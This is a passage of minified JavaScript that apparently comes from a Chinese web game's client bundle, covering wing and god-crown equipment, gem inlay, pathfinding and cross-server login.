a=this.returnEquipPartRed(t.crownId,t.equipId,o,s.partLv);if(a)return!0}else if(i.eqQuilty>=+o){var r=n[o];if(r)for(var l in r){var a=this.returnEquipPartRed(t.crownId,t.equipId,o,0);if(a)return!0}}}}return!1},__decorate([post()],e.prototype,"postInfo",null),__decorate([post()],e.prototype,"updateGodCrownInitData",null),__decorate([post()],e.prototype,"postCrownDateObserve",null),__decorate([post()],e.prototype,"postCrownUpDateObserve",null),__decorate([post()],e.prototype,"postCrownPartUpDateObserve",null),__decorate([post()],e.prototype,"postUseCrownObserve",null),__decorate([post()],e.prototype,"updateCrownEquip",null),__decorate([post()],e.prototype,"updateCrownEquipPart",null),e}(r.BaseSystem);e.GodCrownCT=f,window.GodCrownCT=f,__reflect(f.prototype,"GodCrownCT",[]),Systemap.GodCrownCT=function(){return f.ins()},window.GodCrownCT=f},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.WingCC=void 0;var n=i(55),o=i(0),s=i(39),a=i(4),r=i(13),l=i(23),h=i(2),u=i(14),p=i(306),d=i(165),c=i(6),f=i(19),g=i(59),m=i(12),v=i(15),y=function(t){function u(){var e=t.call(this)||this;return e.godWing=[],e.hint=!0,e.sysId=PackageID.Wing,e.regNetMsg(1,e.doUpDataWing),e.regNetMsg(3,e.postWingWear),e.regNetMsg(4,e.postActivate),e.regNetMsg(5,e.postGodWingData),e.regNetMsg(8,e.postUseDanSuccess),e.regNetMsg(9,e.postWingAppearanceChange),e.regNetMsg(10,e.postGodWingSuitLv),e.regNetMsg(11,e.postWingEquip),e.regNetMsg(13,e.postKeYin),observe(e,e.showNavBtnRedPoint,c.BagCT.ins().postItemAdd,c.BagCT.ins().postItemDel,c.BagCT.ins().postItemChange,l.GameLogic.ins().postSubRoleChange,a.ActorCC.postLevelChange,Ts.wingBoost.levelup,e.postUseDanSuccess),observe(e,e.doBoost,Ts.wingBoost),e}return __extends(u,t),u.prototype.doUpDataWing=function(t){var e=t.readShort(),i=r.SubRoles.ins().getSubRoleByIndex(e);if(i){var n=i.wingsData,s=n.lv,l=n.openStatus;if(i.wingsData.parser(t),this.initConfig(),i.setWingSkill(),s!=n.lv||l!=n.openStatus){var h=o.GlobalConfig.WingLevelConfig[n.lv];h.pasSkillId,i.setWingSkill();var u=o.GlobalConfig.WingLevelConfig[n.appLv];u&&(i.wingID=u.appearance),a.ActorCC.postUpdateWing(),Ts.wingBoost.levelup()}}},u.prototype.doBoost=function(t){var e=t.index,i=t.lv,n=t.exp,o=t.addExp,s=t.clearTime,a=t.crit;return __awaiter(this,void 0,void 0,function(){var t;return __generator(this,function(l){return(t=r.SubRoles.ins().getSubRoleByIndex(e).wingsData)?(t.lv=i,t.exp=n,t.clearTime=s,this.postBoost(a,o),this.postWingTime(),[2]):[2]})})},u.prototype.initConfig=function(){if(!this.wingSkillDic||!this.wingSkillDic.length){this.wingSkillDic=[];var t=o.GlobalConfig.WingLevelConfig;for(var e in t)if(t[e].pasSkillId){var i={skillId:t[e].pasSkillId,wingLv:t[e].level};this.wingSkillDic.push(i)}}},u.prototype.getWingSkillByIndex=function(t){return this.initConfig(),this.wingSkillDic[t]},u.prototype.sendUpgrade=function(t){var e=this.getBytes(3);e.writeShort(t),this.sendToServer(e)},u.prototype.sendActivate=function(t){var e=this.getBytes(4);e.writeShort(t),this.sendToServer(e)},u.prototype.dressWingEquip=function(t,e,i){var n=this.getBytes(11);n.writeDouble(e),n.writeShort(t),n.writeShort(i),this.sendToServer(n)},u.prototype.sendBigUpLevel=function(t){var e=this.getBytes(12);e.writeInt(t),this.sendToServer(e)},u.prototype.doBigUpLevel=function(t){var e,i=t.readInt();if(i)e="道具不足够";else{t.readInt()}h.TipsCT.ins().showTips(e)},u.prototype.postBoost=function(t,e){return[t,e]},u.prototype.postActivate=function(t){return __awaiter(this,void 0,void 0,function(){var e,i,n,s;return __generator(this,function(l){return e=t.readShort(),(i=r.SubRoles.ins().getSubRoleByIndex(e))?(n=i.wingsData,n.parserOpenStatus(t),i.setWingSkill(),s=o.GlobalConfig.WingLevelConfig[n.lv],s&&!i.wingID&&(i.wingID=s.appearance),a.ActorCC.postUpdateWing(),[2]):[2]})})},u.prototype.postWingEquip=function(t){},u.prototype.postWingTime=function(){},u.prototype.sendKeYin=function(t){var e=this.getBytes(13);e.writeByte(t),this.sendToServer(e)},u.prototype.postKeYin=function(t){var e=t.readByte(),i=this.getGodWing(e);i.keYinLv=t.readUnsignedShort(),i.keYinExp=t.readUnsignedInt();for(var n in o.GlobalConfig.GodWingLevelExtraConfig){var s=o.GlobalConfig.GodWingLevelExtraConfig[n].level;i.keYinLv>=s&&(i.keYinSuitLv=s)}},u.prototype.showNavBtnRedPoint=function(){return __awaiter(this,void 0,void 0,function(){var t,e,n;return __generator(this,function(o){switch(o.label){case 0:return[4,Promise.resolve().then(function(){return i(933)})];case 1:return t=o.sent().RoleCT,e=!1,(n=m.OpenSystem.ins().checkSysOpen(v.SystemType.Wing))?!e&&this.and(this.canGradeupWing())?(t.ins().showNavBtnRedPoint(!0),[2]):this.canUseFlyUp()?(t.ins().showNavBtnRedPoint(!0),[2]):this.canUseAptitude()?(t.ins().showNavBtnRedPoint(!0),[2]):(t.ins().showNavBtnRedPoint(!1),[2]):[2]}})})},u.prototype.and=function(t){for(var e in t)if(1==t[e])return!0;return!1},u.prototype.getLevelBySkill=function(t){if(!this.wingSkillLevelDic){this.wingSkillLevelDic=[];var e=o.GlobalConfig.WingLevelConfig;for(var i in e)e[i].pasSkillId>0&&this.wingSkillLevelDic.push(e[i].level)}return this.wingSkillLevelDic[t]?this.wingSkillLevelDic[t]:0},u.prototype.canGradeupWing=function(){var t=[!1,!1,!1];return t},u.prototype.canItemGradeupWing=function(t){var e;void 0===t&&(t=-1);var i=!1,n=d.WingEnum.WingMaxLv,s=r.SubRoles.ins().getSubRoleByIndex(t);if(s){var a=null===(e=null===s||void 0===s?void 0:s.wingsData)||void 0===e?void 0:e.openStatus;if(a){var l=s.wingsData.lv;if(n>l){var h=o.GlobalConfig.WingLevelConfig[l],u=c.BagCT.ins().getBagGoodsCountById(0,h.itemId);i=h.itemNum<=u}else i=!1;if(!i){var p=c.BagCT.ins().getBagGoodsCountById(0,o.GlobalConfig.WingCommonConfig.levelItemid);i=p>0&&l==d.WingEnum.WingExpRedPoint}}return i}},u.prototype.isHaveActivationWing=function(t){void 0===t&&(t=-1);var e=(a.ActorCC.level,m.OpenSystem.ins().checkSysOpen(v.SystemType.Wing));if(!e)return!1;var i=r.SubRoles.ins().subRolesLen;if(-1==t)for(var n=0;i>n;n++){var o=r.SubRoles.ins().getSubRoleByIndex(n).wingsData;if(!o.openStatus)return!0}else{var o=r.SubRoles.ins().getSubRoleByIndex(t).wingsData;if(!o.openStatus)return!0}return!1},u.prototype.canRoleOpenWing=function(){var t=[!1,!1,!1];return t},u.prototype.sendWingWear=function(t,e,i){var n=this.getBytes(3);n.writeShort(t),n.writeInt(e),n.writeShort(i),this.sendToServer(n)},u.prototype.postWingWear=function(t){var e=t.readBoolean();return e?1:0},u.prototype.postGodWingData=function(t){var e=t.readShort();this.godWing[e]||(this.godWing[e]=new p.GodWingData),this.godWing[e].parser(t)},u.prototype.sendWingAppearanceChange=function(t,e){var i=this.getBytes(9);i.writeShort(t),i.writeInt(e),this.sendToServer(i)},u.prototype.postWingAppearanceChange=function(t){var e=t.readInt(),i=r.SubRoles.ins().getSubRoleByIndex(0);i.wingsData.appLv=e;var n=o.GlobalConfig.WingLevelConfig[e];n&&(i.wingID=n.appearance),a.ActorCC.postUpdateWing()},u.prototype.postGodWingSuitLv=function(t){return __awaiter(this,void 0,void 0,function(){var e,i;return __generator(this,function(n){return e=0,i=this.getGodWing(e),i.suitLevel=t.readInt(),[2]})})},u.prototype.sendGodWingSuitLv=function(t){var e=this.getBytes(8);e.writeByte(t),this.sendToServer(e)},u.prototype.sendUseDan=function(t,e){var i=this.getBytes(8);i.writeByte(t),i.writeByte(e),this.sendToServer(i)},u.prototype.postUseDanSuccess=function(t){var e=r.SubRoles.ins().getSubRoleByIndex(t.readByte()).wingsData,i=t.readByte(),n=t.readShort();0==i?e.aptitudeDan=n:e.flyUpDan=n},u.prototype.canUseFlyUp=function(){return!1},u.prototype.canUseFlyUpByRoleID=function(t){return!1},u.prototype.canUseAptitude=function(){return!1},u.prototype.canUseAptitudeByRoleID=function(t){return!1},u.prototype.userDans=function(t){for(var e,i,n,s=r.SubRoles.ins().roles.length,a=null,l=null,u=0,p=0,d=t==o.GlobalConfig.WingCommonConfig.attrPillId,c=0;s>c;c++)e=r.SubRoles.ins().getSubRoleByIndex(c),1==e.wingsData.openStatus?(i=o.GlobalConfig.WingLevelConfig[e.wingsData.lv],n=d&&e.wingsData.aptitudeDan>=i.attrPill||!d&&e.wingsData.flyUpDan>=i.flyPill,n?p++:(a||(a=e),e.wingsData.lv>a.wingsData.lv&&(a=e),l||(l=e),d&&e.wingsData.aptitudeDan>a.wingsData.aptitudeDan&&(l=e),!d&&e.wingsData.flyUpDan>a.wingsData.flyUpDan&&(l=e))):u++;if(u>=s)return void h.TipsCT.ins().showTips("所有角色均未开启翅膀");if(p>=s)return void h.TipsCT.ins().showTips("所有角色翅膀"+(d?"资质":"飞升")+"已满级");var f=a.index;a.index!=l.index&&a.wingsData.lv==l.wingsData.lv&&(f=l.index),win.open("RolePanel",3,f)},u.prototype.sendWingCompose=function(t,e,i){var n=t,o=this.getBytes(6);o.writeShort(n),o.writeInt(e),1==n&&o.writeInt(i),this.sendToServer(o)},u.prototype.sendResetGodWing=function(t,e){var i=this.getBytes(7);i.writeInt(t),i.writeInt(e),this.sendToServer(i)},u.prototype.getCurLevelItemId=function(t,e){var i,n;return this.godWing[t]&&(n=this.godWing[t].getLevel(e))?i=o.GlobalConfig.GodWingLevelConfig[n][e]:null},u.prototype.getNextLevelItemId=function(t,e){var i;return i=this.godWing[t].getLevel(e),i=i?this.getNextLevel(i):0,o.GlobalConfig.GodWingLevelConfig[i]?o.GlobalConfig.GodWingLevelConfig[i][e]:null},u.prototype.quickComposeRedPoint=function(t,e){return!1},u.prototype.wearItemRedPoint=function(t,e){return this.checkSlotLevel(t,e)},u.prototype.gridRedPoint=function(t,e){return this.wearItemRedPoint(t,e)?!0:this.quickComposeRedPoint(t,e)},u.prototype.isWearGodWing=function(t){var e=r.SubRoles.ins().getSubRoleByIndex(t);if(!e)return!1;for(var i=1;i<=d.WingEnum.GodWingMaxSlot;i++)if(this.gridRedPoint(e.index,i))return!0;return!1},u.prototype.checkSlot=function(t,e){var i=this.getGodWing(t).getLevel(e);return i?!0:!1},u.prototype.getWearItem=function(t,e){for(var i=this.getGodWing(t).getLevel(e),n=c.BagCT.ins().getBagGoodsByType(s.ItemType.TYPE_16),a=0;a<n.length;a++){var r=o.GlobalConfig.GodWingItemConfig[n[a].configID];if(!this.checkGodWingLevel(t,r.itemId)&&r.slot==e&&r.level>i)return r.itemId}return 0},u.prototype.checkSlotLevel=function(t,e){for(var i=this.getGodWing(t).getLevel(e),n=c.BagCT.ins().getBagGoodsByType(s.ItemType.TYPE_16),a=0;a<n.length;a++){var r=o.GlobalConfig.GodWingItemConfig[n[a].configID];if(!this.checkGodWingLevel(t,r.itemId)&&r.slot==e&&r.level>i)return!0}return!1},u.prototype.getBestGodWingLevel=function(t,e){for(var i=this.getGodWing(t).getLevel(e),n=c.BagCT.ins().getBagGoodsByType(s.ItemType.TYPE_16),a=0;a<n.length;a++){var r=o.GlobalConfig.GodWingItemConfig[n[a].configID];!this.checkGodWingLevel(t,r.itemId)&&r.slot==e&&r.level>i&&(i=r.level)}return i},u.prototype.checkGodWingLevel=function(t,e){var i=o.GlobalConfig.GodWingItemConfig[e],n=0,s=r.SubRoles.ins().getSubRoleByIndex(t).wingsData;return n+=s.lv,s.openStatus&&(n+=1),n>=i.level?0:i.level},u.prototype.isComposeGodWingOnly=function(t){for(var e=o.GlobalConfig.SyntheticConfig[t],i=e.cost,n=0;n<i.length;n++)if(!f.GlobalFun.checkCost(i[n].count,i[n].id,"",!1))return!1;return!0},u.prototype.isComposeGodWingAll=function(){for(var t in o.GlobalConfig.GodWingSuitConfig)for(var e=o.GlobalConfig.GodWingSuitConfig[t],i=1;i<=d.WingEnum.GodWingMaxSlot;i++){var n=o.GlobalConfig.GodWingLevelConfig[e.lv][i];if(this.isComposeGodWingOnly(n.itemId))return!0}return!1},u.prototype.isComposeGodWingLevel=function(t,e){var i=o.GlobalConfig.GodWingLevelConfig[t][e];return this.isComposeGodWingOnly(i.itemId)},u.prototype.isComposeGodWingSlot=function(t,e){var i=o.GlobalConfig.GodWingSuitConfig[t],n=o.GlobalConfig.GodWingLevelConfig[i.lv][e];return this.isComposeGodWingOnly(n.itemId)},u.prototype.calcGodWingSlot=function(t){for(var e=[],i=1;i<=d.WingEnum.GodWingMaxSlot;i++){var n=this.getGodWing(t).getLevel(i),o={slot:0,level:0};o.slot=i,n||(n=this.getStartLevel(i)),o.level=n,e.push(o)}return e},u.prototype.getStartLevel=function(t){for(var e in o.GlobalConfig.GodWingLevelConfig){var i=o.GlobalConfig.GodWingLevelConfig[e];for(var n in i)if(i[n].slot==t)return i[n].level}return 0},u.prototype.getStartGodWing=function(t){for(var e in o.GlobalConfig.GodWingLevelConfig){var i=o.GlobalConfig.GodWingLevelConfig[e];for(var n in i)if(i[n].slot==t)return i[n]}return null},u.prototype.getPreLevel=function(t){var e=0;for(var i in o.GlobalConfig.GodWingLevelConfig)if(e){if(Number(i)==t)return e;e=Number(i)}else e=Number(i);return e},u.prototype.getNextLevel=function(t){var e=[];for(var i in o.GlobalConfig.GodWingLevelConfig)e.push(+i);e.sort(function(t,e){return n.Algorithm.sortAsc(t,e)});for(var s=0,a=e;s<a.length;s++){var r=a[s];if(r>t)return r}return 0},u.prototype.getNameFromSlot=function(t){var e="";switch(t){case 1:e=gettext("飞羽");break;case 2:e=gettext("纤羽");break;case 3:e=gettext("绒羽");break;case 4:e=gettext("翎羽");break;case 5:e=gettext("覆羽");break;case 6:e=gettext("正羽");break;case 7:e=gettext("肩羽");break;case 8:e=gettext("轻羽")}return e},u.prototype.getGodWingComposeTarget=function(t){var e=o.GlobalConfig.GodWingItemConfig[t];if(!e)return null;for(var i in o.GlobalConfig.GodWingItemConfig){var n=o.GlobalConfig.GodWingItemConfig[i];if(n.slot==e.slot&&n.level==e.level+1)return n}return null},u.prototype.getGodWingDecomItemList=function(){var t=[],e=c.BagCT.ins().bagModel[c.BagCT.BAG_TYPE_OTHTER];if(e&&e.length>0)for(var i=0;i<e.length;i++)o.GlobalConfig.GodWingItemConfig[e[i].configID]&&t.push(e[i]);return t},u.prototype.checkGodWingIsDescom=function(t){var e=o.GlobalConfig.GodWingItemConfig[t];if(!e)return!1;for(var i=1;i<=d.WingEnum.GodWingMaxSlot;i++){var n=this.getGodWing(0).getLevel(i);if(e.slot==i&&e.level<=n)return!0}return!1},u.prototype.getGodWingSuitCfg=function(t){void 0===t&&(t=0);var i,n=e.WingCC.getGodWing(t),s=o.GlobalConfig.GodWingSuitConfig,a=n.getSuitLevel(),r=!1;if(a?(i=s[a],i.skillname&&(r=!0)):i=s[1],!i.skillname)for(var l in s)if(s[l].skillname){i=s[l];break}return i},u.prototype.getGodWing=function(t){return this.godWing[t]||(this.godWing[t]=new p.GodWingData),this.godWing[t]},u.prototype.getNextGodWingLevel=function(t){void 0===t&&(t=0);var i=e.WingCC.getGodWing(t),n=i.getSuitLevel();for(var s in o.GlobalConfig.GodWingSuitConfig){var a=o.GlobalConfig.GodWingSuitConfig[s];if(a.skillname&&a.lv>n)return a.lv}return 0},u.prototype.wearGodWing=function(t,i,n){return i&&e.WingCC.checkGodWingLevel(t,i)?(h.TipsCT.ins().showTips(gettext("|C:0xF3311E&T:翅膀等级不足，无法穿戴|")),void g.GameFlashSaleCt.ins().reportWingMaterialNot()):void this.sendWingWear(t,i,n)},__decorate([post()],u.prototype,"postBoost",null),__decorate([post()],u.prototype,"postActivate",null),__decorate([post()],u.prototype,"postWingEquip",null),__decorate([post()],u.prototype,"postWingTime",null),__decorate([post()],u.prototype,"postKeYin",null),__decorate([delayCall(4e3)],u.prototype,"showNavBtnRedPoint",null),__decorate([post()],u.prototype,"postWingWear",null),__decorate([post()],u.prototype,"postGodWingData",null),__decorate([post()],u.prototype,"postWingAppearanceChange",null),__decorate([post()],u.prototype,"postGodWingSuitLv",null),__decorate([post()],u.prototype,"postUseDanSuccess",null),u}(u.BaseSystem);window.wingcc=y,__reflect(y.prototype,"wingcc",[]),e.WingCC=new y,window.WingCC=e.WingCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.MainFightCC=e.mainfightcc=void 0;var n=i(101),o=i(20),s=i(53),a=i(289),r=i(290),l=i(37),h=i(0),u=i(95),p=i(32),d=i(105),c=function(t){function e(){var e=t.call(this)||this;return observe(e,e.onEnterScene,p0_4.addRole),e.initAstar(),e}return __extends(e,t),e.prototype.initInfo=function(){var t=h.GlobalConfig.ScenesConfig[o.GameMap.mapID],i=(null===t||void 0===t?void 0:t.sizeX)?h.GlobalConfig.ScenesConfig[o.GameMap.mapID].sizeX:e.defaultX,n=(null===t||void 0===t?void 0:t.sizeY)?h.GlobalConfig.ScenesConfig[o.GameMap.mapID].sizeY:e.defaultY;e.wNum=i,e.hNum=n,this.initAstar()},e.prototype.initAstar=function(){for(var t=[],i=(e.wNum+1)*(e.hNum+1),n=0;i>n;n++)t.push(1);var o={discardList:[],grids:t,maxX:e.wNum+1,maxY:e.hNum+1,pixHeight:1,pixWidth:1,title_wh:1,version:1},s=new a.MapGrid;s.initMapInfo(o,0),this.aStar=this.aStar||new r.AStar,this.aStar.initFromMap(s)},e.prototype.onEnterScene=function(){var t;o.GameMap.fbType!=p.FbCT.FB_TYPE_CITY&&o.GameMap.fbType!=p.FbCT.FB_PVP&&o.GameMap.fbType!=p.FbCT.FB_TYPE_PEAKED&&o.GameMap.fbType!=p.FbCT.FB_TYPE_KF_ARENA&&(o.GameMap.checkIsInShiKongZhiJing()&&(null===(t=h.GlobalConfig.InstanceConfig[o.GameMap.fubenID])||void 0===t?void 0:t.camp)==d.CampMode.PWACE||s.ControlCC.setAuto(!0))},e.gridToX=function(t,e){return void 0===e&&(e=1),t*this.gridW},e.gridToY=function(t,e){return void 0===e&&(e=1),t*this.gridH},e.xToGrid=function(t){return Math.floor(t/this.gridW)},e.yToGrid=function(t){return Math.floor(t/this.gridH)},e.poxToGrid=function(t){var e=t.x,i=t.y;return{x:this.xToGrid(e),y:this.yToGrid(i)}},e.gridToPox=function(t){var e=t.x,i=t.y;return{x:this.gridToX(e),y:this.gridToY(i)}},e.prototype.getPath=function(t,e,i,n,o){void 0===o&&(o=null),this.updateAStar(o);var s=this.aStar.getPath(t+1,e+1,i+1,n+1);if(s)for(var a=0,r=s;a<r.length;a++){var l=r[a];l.nX-=1,l.nY-=1}return s},e.prototype.updateAStar=function(t){void 0===t&&(t=null);for(var e=this.aStar.maxX,i=this.aStar.maxY,n=0;i>n;n++)for(var o=0;e>o;o++){var s=this.aStar.getCell(o,n);s.CanNotMove=0==n||0==o}var a=l.EntityManager.ins().getAllEntity();for(var r in a){var p=a[r],d=p.infoModel.configID,c=h.GlobalConfig.MonstersConfig[d];if((null===c||void 0===c?void 0:c.type)!=u.MonsterType.MonsterType_Fire&&(null===c||void 0===c?void 0:c.type)!=u.MonsterType.MonsterType_GatherMonster){var f=1;c&&c.size>1&&(f=c.size);var g=[];if(t&&p==t){if(1==f)continue}else for(var m=1;f>=m;m++)for(var v=1;f>=v;v++){var y=this.aStar.getCell(p.data.gridX+m,p.data.gridY+v);y&&g.push(y)}for(var C=0,T=g;C<T.length;C++){var y=T[C];y.CanNotMove=!0}}}},e.gridW=120,e.gridH=128,e.wNum=6,e.hNum=5,e.defaultX=6,e.defaultY=5,__decorate([delayCall(1e3)],e.prototype,"onEnterScene",null),e}(n.CC);e.mainfightcc=c,window.mainfightcc=c,__reflect(c.prototype,"mainfightcc",[]),e.MainFightCC=new c,window.MainFightCC=e.MainFightCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CC=void 0;var n=i(135),o=function(t){function e(){var e=t.call(this)||this;return e.initLogin&&observe(e,e.initLogin,n.GameApp.ins().postLoginInit),e.initZero&&observe(e,e.initZero,n.GameApp.ins().postZeroInit),e}return __extends(e,t),e}(egret.HashObject);e.CC=o,window.CC=o,__reflect(o.prototype,"CC",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.ServerType=e.KFServerSys=void 0;var n=i(61),o=i(14),s=i(4),a=i(23),r=i(2),l=i(47),h=function(t){function e(){var e=t.call(this)||this;return e.isLinkingKF=!1,e.curServerType=u.bsCommSrv,e.isWgClose=0,e.sysId=PackageID.Login,e.regNetMsg(9,e.doSwitchServer),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.linkingKFState=function(t){if(this.isLinkingKF=t,t)win.closeTopLevel(),win.open("ServerSwitchIngWin");else{var e=win.get("ServerSwitchIngWin");e&&e.redClose()}},e.prototype.doSwitchServer=function(t){this.kfSrvid=t.readInt(),this.kfIp=t.readString(),this.kfPort=t.readInt(),this.kfLoginKey=t.readString(),this.curServerType=t.readInt();var e=t.readUnsignedByte();this.isWgClose=e,console.log("255-9  ==1接收连接跨服服务器！ip:"+this.kfIp+" port:"+this.kfPort+"type:"+this.curServerType),this.linkingKFState(!0),Timer.start(2e3,1,this.connectKFServer,this),l.KfArenaSys.ins().resetScore()},e.prototype.sendKFLogin=function(){var t=this.getBytes(9);t.writeInt(s.ActorCC.actorID),t.writeString(this.kfLoginKey),this.sendToServer(t)},Object.defineProperty(e.prototype,"isKF",{get:function(){return this.isKFServ},enumerable:!1,configurable:!0}),Object.defineProperty(e.prototype,"isKFServ",{get:function(){return this.curServerType>u.bsCommSrv},enumerable:!1,configurable:!0}),e.prototype.connectKFServer=function(){return __awaiter(this,void 0,void 0,function(){return __generator(this,function(t){switch(t.label){case 0:return console.warn("KFServerSys-connectKFServer"),a.GameLogic.ins().resetRoleStatus(),Socket.ins().close(),Socket.ins().newSocket(),Socket.ins().getSocket().connected?[3,5]:(console.log("kf connect to "+this.kfIp+" ,port: "+this.kfPort),console.log("重新连接跨服服务器！ip:"+this.kfIp+" port:"+this.kfPort),platform&&platform.reportError(s.ActorCC.actorID+"重新连接跨服服务器！ip:"+this.kfIp+" port:"+this.kfPort+" serviceType:"+this.curServerType),this.curServerType!=u.bsCommSrv?[3,2]:(Socket.ins().loginCount--,[4,Socket.ins().reconnect()]));case 1:return t.sent(),[3,4];case 2:return platform&&platform.reportError(s.ActorCC.actorID+"  开始链接socket:"+this.kfIp+" port:"+this.kfPort),[4,Socket.ins().connect(this.kfIp,s.ActorCC.actorID)];case 3:t.sent(),Socket.ins().setDispatch(!0),this.sendKFLogin(),platform&&platform.reportError(s.ActorCC.actorID+" 开始登陆跨服服务器！ipgameso 111 :"+this.kfIp+" port:"+this.kfPort),t.label=4;case 4:return[3,6];case 5:console.log("开始登陆跨服服务器！ipgameso:"+this.kfIp+" port:"+this.kfPort),platform&&platform.reportError(s.ActorCC.actorID+" 开始登陆跨服服务器！ipgameso 222 :"+this.kfIp+" port:"+this.kfPort),this.sendKFLogin(),t.label=6;case 6:return[2]}})})},e.prototype.closeSocket=function(){this.curServerType=u.bsCommSrv,this.kfSrvid=n.LocationProperty.srvid,console.error("close socket , come to simple server~")},e.prototype.checkIsKFBattle=function(t){return this.isKF&&t&&r.TipsCT.ins().showTips(t),this.isKF},e.prototype.initLogin=function(){this.linkingKFState(!1)},e}(o.BaseSystem);e.KFServerSys=h,window.KFServerSys=h,__reflect(h.prototype,"KFServerSys",[]);var u;!function(t){t[t.bsCommSrv=0]="bsCommSrv",t[t.bsBattleSrv=1]="bsBattleSrv",t[t.bsMainBattleSrv=2]="bsMainBattleSrv",t[t.bsLianFuSrv=3]="bsLianFuSrv"}(u=e.ServerType||(e.ServerType={})),window.ServerType=u,Systemap.KFServerSys=function(){return h.ins()},window.KFServerSys=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StageUtils=void 0;var n=i(50),o=function(t){function e(){var i=t.call(this)||this;return null==e._uiStage&&(e._uiStage=new eui.UILayer,e._uiStage.touchEnabled=!1,e._uiStage.percentHeight=100,e._uiStage.percentWidth=100,i.getStage().addChild(e._uiStage)),i}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.getHeight=function(){return this.getStage().stageHeight},e.prototype.getWidth=function(){return this.getStage().stageWidth},e.prototype.setTouchChildren=function(t){this.getStage().touchChildren=t},e.prototype.setMaxTouches=function(t){this.getStage().maxTouches=t},e.prototype.setFrameRate=function(t){this.getStage().frameRate=t},e.prototype.setScaleMode=function(t){this.getStage().scaleMode=t},e.prototype.getStage=function(){return egret.MainContext.instance.stage},e.prototype.getUIStage=function(){return e._uiStage},e}(n.BaseClass);e.StageUtils=o,window.StageUtils=o,__reflect(o.prototype,"StageUtils",[]),window.StageUtils=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.EquipInlayCT=void 0;var n=i(14),o=i(37),s=i(0),a=i(48),r=i(13),l=i(6),h=i(40),u=i(62),p=i(207),d=i(208),c=function(t){function e(){var e=t.call(this)||this;return e.suitDatas=[],e.CDMap=[],e.sysId=PackageID.EquipInlay,e.regNetMsg(1,e.patchGemInfo),e.regNetMsg(2,e.patchUpgrade),e.regNetMsg(3,e.patchMakeAHole),e.regNetMsg(4,e.updateGemInfo),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.getReviseSkillIdCD=function(t){for(var e=Math.floor(t/1e3),i=r.SubRoles.ins().getSubRoleByIndex(0),n=0;n<u.EquipPos.MAX;n++){var o=i.getEquipDataByPos(n),a=o.gemDatas;a.sort(this.fushiSort);for(var l=0;l<a.length;l++){var h=a[l],p=s.GlobalConfig.GemPrefixConfig[h.itemData.getPrefixId()];if(p){var d=p.skill[h.itemData.getGemLv()-1],c=s.GlobalConfig.GemReviseConfig[d].skill;if(c==e&&s.GlobalConfig.GemReviseConfig[d]&&this.CDMap[d]&&s.GlobalConfig.GemReviseConfig[d].cd>0)return s.GlobalConfig.GemReviseConfig[d].cd}}}return 0},e.prototype.fushiSort=function(t,e){var i=t.itemData.getPrefixId(),n=e.itemData.getPrefixId();
return n-i},e.prototype.patchGemInfo=function(t){var e=(t.readShort(),t.readShort()),i=t.readShort(),n=new h.ItemData;n.parser(t);var o=n.getGemSkillId();this.CDMap[o]={reviseSkillId:o};var s=r.SubRoles.ins().getSubRoleByIndex(0),a=null===s||void 0===s?void 0:s.getEquipByIndex(e);if(a){var l=a.gemDatas?a.gemDatas:[];l=l.sort(function(t,e){return t.pos-e.pos});var u=l[i]?l[i]:new p.EquipInlayData;u.setGemPosition(i),u.updateItemData(n)}},e.prototype.patchUpgrade=function(t){for(var e=t.readDouble(),i=t.readInt(),n=l.BagCT.ins().getBagItemsByType(l.BagCT.BAG_TYPE_OTHTER),o=0;o<n.length;o++){var s=n[o];if(s.handle==e){s.setGemLv(i);break}}for(var h,u=r.SubRoles.ins().getSubRoleByIndex(0),o=0;o<a.Role.typeNumberToNameLen;o++){h=u.getEquipByIndex(o);for(var p=(null===h||void 0===h?void 0:h.gemDatas)||[],d=0;d<p.length;d++){var c=p[d];if(c.itemData&&0!=c.itemData.handle&&c.itemData.handle==e){c.itemData.setGemLv(i);var f=c.itemData.getGemSkillId();return void(this.CDMap[f]={reviseSkillId:f})}}}},e.prototype.patchMakeAHole=function(t){var e=(t.readShort(),t.readShort()),i=t.readShort(),n=t.readByte(),o=r.SubRoles.ins().getSubRoleByIndex(0),s=null===o||void 0===o?void 0:o.getEquipByIndex(e);if(s){var a=s.gemDatas=s.gemDatas||[],l=a[i]=a[i]||new p.EquipInlayData;l.setGemPosition(i),l.setGemLock(n)}},e.prototype.updateGemInfo=function(t){var e=t.readDouble(),i=o.EntityManager.ins().getEntityByHandle(e);if(i){var n=t.readShort();i.data.suitData=[];for(var s=0;n>s;s++){var a=t.readInt();i.data.suitData.push(a)}}},e.prototype.sendWearOrTakeOff=function(t,e,i,n){var o=0,s=this.getBytes(1);s.writeByte(t),s.writeDouble(e),s.writeShort(o),s.writeShort(i),s.writeShort(n),this.sendToServer(s)},e.prototype.sendUpgrade=function(t){var e=this.getBytes(2);e.writeDouble(t),this.sendToServer(e)},e.prototype.sendMakeAHole=function(t,e){var i=0,n=this.getBytes(3);n.writeShort(i),n.writeShort(t),n.writeShort(e),this.sendToServer(n)},e.prototype.getGemDatas=function(t){for(var e=r.SubRoles.ins().getSubRoleByIndex(0),i=e.getEquipByIndex(t),n=(null===i||void 0===i?void 0:i.gemDatas)||[],o=[],s=0;s<n.length;s++){var a=n[s];a.itemData&&0!=a.itemData.handle&&o.push(a)}return o},e.prototype.getPosGemDatas=function(t){var e=r.SubRoles.ins().getSubRoleByIndex(0),i=e.getEquipByIndex(t);return(null===i||void 0===i?void 0:i.gemDatas.concat())||[]},e.prototype.getSuitDataById=function(t){return this.suitDatas[t]=this.suitDatas[t]||new d.EquipInlaySuitData(t),this.suitDatas[t]},e.prototype.viewShowSkill=function(t){return t},e.prototype.getReviseSkillId=function(t){for(var e=Math.floor(t/1e3),i=r.SubRoles.ins().getSubRoleByIndex(0),n=0;n<u.EquipPos.MAX;n++){var o=i.getEquipDataByPos(n),a=o.gemDatas;a.sort(this.fushiSort);for(var l=0;l<a.length;l++){var h=a[l],p=s.GlobalConfig.GemPrefixConfig[h.itemData.getPrefixId()];if(p){var 